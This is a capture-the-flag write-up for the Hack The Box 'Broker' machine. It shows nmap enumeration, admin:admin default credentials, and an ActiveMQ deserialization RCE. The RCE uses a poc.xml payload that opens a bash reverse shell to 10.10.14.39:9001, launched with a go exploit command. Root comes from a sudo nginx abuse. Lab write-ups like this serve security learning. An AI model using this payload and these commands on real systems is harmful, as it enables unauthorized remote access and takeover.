---
title: HTB Broker (2024)
author: kei5uke
draft: true
description: Writeup for HTB Broker (2024)
tags:
  - linux
  - writeup
---

# Enumeration

```
nmap 10.129.189.105 -sC -sV -p- -A -T4 --min-rate 10000 -oN nmap_tcp.txt
Starting Nmap 7.93 ( https://nmap.org ) at 2024-08-01 12:17 CEST
Nmap scan report for 10.129.189.105
Host is up (0.052s latency).
Not shown: 65526 closed tcp ports (reset)
PORT      STATE SERVICE    VERSION
22/tcp    open  ssh        OpenSSH 8.9p1 Ubuntu 3ubuntu0.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 3eea454bc5d16d6fe2d4d13b0a3da94f (ECDSA)
|_  256 64cc75de4ae6a5b473eb3f1bcfb4e394 (ED25519)
80/tcp    open  http       nginx 1.18.0 (Ubuntu)
|_http-title: Error 401 Unauthorized
| http-auth: 
| HTTP/1.1 401 Unauthorized\x0D
|_  basic realm=ActiveMQRealm
|_http-server-header: nginx/1.18.0 (Ubuntu)
1883/tcp  open  mqtt
|_mqtt-subscribe: Failed to receive control packet from server.
5672/tcp  open  amqp?
| fingerprint-strings: 
|   DNSStatusRequestTCP, DNSVersionBindReqTCP, GetRequest, HTTPOptions, RPCCheck, RTSPRequest, SSLSessionReq, TerminalServerCookie: 
|     AMQP
|     AMQP
|     amqp:decode-error
|_    7Connection from client using unsupported AMQP attempted
|_amqp-info: ERROR: AQMP:handshake expected header (1) frame, but was 65
8161/tcp  open  http       Jetty 9.4.39.v20210325
|_http-title: Error 401 Unauthorized
| http-auth: 
| HTTP/1.1 401 Unauthorized\x0D
|_  basic realm=ActiveMQRealm
|_http-server-header: Jetty(9.4.39.v20210325)
43565/tcp open  tcpwrapped
61613/tcp open  stomp      Apache ActiveMQ
| fingerprint-strings: 
|   HELP4STOMP: 
|     ERROR
|     content-type:text/plain
|     message:Unknown STOMP action: HELP
|     org.apache.activemq.transport.stomp.ProtocolException: Unknown STOMP action: HELP
|     org.apache.activemq.transport.stomp.ProtocolConverter.onStompCommand(ProtocolConverter.java:258)
|     org.apache.activemq.transport.stomp.StompTransportFilter.onCommand(StompTransportFilter.java:85)
|     org.apache.activemq.transport.TransportSupport.doConsume(TransportSupport.java:83)
|     org.apache.activemq.transport.tcp.TcpTransport.doRun(TcpTransport.java:233)
|     org.apache.activemq.transport.tcp.TcpTransport.run(TcpTransport.java:215)
|_    java.lang.Thread.run(Thread.java:750)
61614/tcp open  http       Jetty 9.4.39.v20210325
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-title: Site doesn't have a title.
|_http-server-header: Jetty(9.4.39.v20210325)
61616/tcp open  apachemq   ActiveMQ OpenWire transport
| fingerprint-strings: 
|   NULL: 
|     ActiveMQ
|     TcpNoDelayEnabled
|     SizePrefixDisabled
|     CacheSize
|     ProviderName 
|     ActiveMQ
|     StackTraceEnabled
|     PlatformDetails 
|     Java
|     CacheEnabled
|     TightEncodingEnabled
|     MaxFrameSize
|     MaxInactivityDuration
|     MaxInactivityDurationInitalDelay
|     ProviderVersion 
|_    5.15.15

```

# HTTP 80

admin:admin gets you panel

![[HTB Broker (2024) - Untitled.png]]

This version has JAVA serialisation vulnerability, which leads to RCE

[https://github.com/X1r0z/ActiveMQ-RCE](https://github.com/X1r0z/ActiveMQ-RCE)

- POC.XML
    
    ```jsx
    <?xml version="1.0" encoding="UTF-8" ?>
        <beans xmlns="http://www.springframework.org/schema/beans"
           xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
           xsi:schemaLocation="
         http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd">
            <bean id="pb" class="java.lang.ProcessBuilder" init-method="start">
                <constructor-arg>
                <list>
    		<value>bash</value>
                    <value>-c</value>
    		<value>bash -i &gt;&amp; /dev/tcp/10.10.14.39/9001 0&gt;&amp;1</value>
                </list>
                </constructor-arg>
            </bean>
        </beans>
    
    ```
    

`python3 -m http.server 8000`

`go run main.go -i 10.129.189.105 -u [http://10.10.14.39:8000/poc.xml](http://10.10.14.39:8000/poc.xml)`

and got shell

![[HTB Broker (2024) - Untitled 1.png]]

# Privilege Escalation

activemq user can execute this command as root: `/usr/sbin/nginx`

[https://gist.github.com/DylanGrl/ab497e2f01c7d672a80ab9561a903406](https://gist.github.com/DylanGrl/ab497e2f01c7d672a80ab9561a903406)

By using this exploit above, this leads to root having specified key for the ssh

and we got the root shell.

![[HTB Broker (2024) - Untitled 2.png]]
